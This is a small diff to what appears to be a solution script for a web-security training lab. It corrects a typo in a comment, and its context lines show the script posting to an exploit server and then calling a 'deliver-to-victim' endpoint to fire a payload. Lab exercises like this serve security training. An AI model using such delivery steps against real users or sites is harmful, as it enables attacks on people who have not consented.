@@ -29,7 +29,7 @@ def main():
     r1 = requests.post(uri, data=data)
     
 
-    # Trigger the victime to access the exploit server and activate the payload
+    # Trigger the victim to access the exploit server and activate the payload
     uri = f"https://{exploit_serv_id}.exploit-server.net/deliver-to-victim"
     r2 = requests.get(uri)
     print('done')
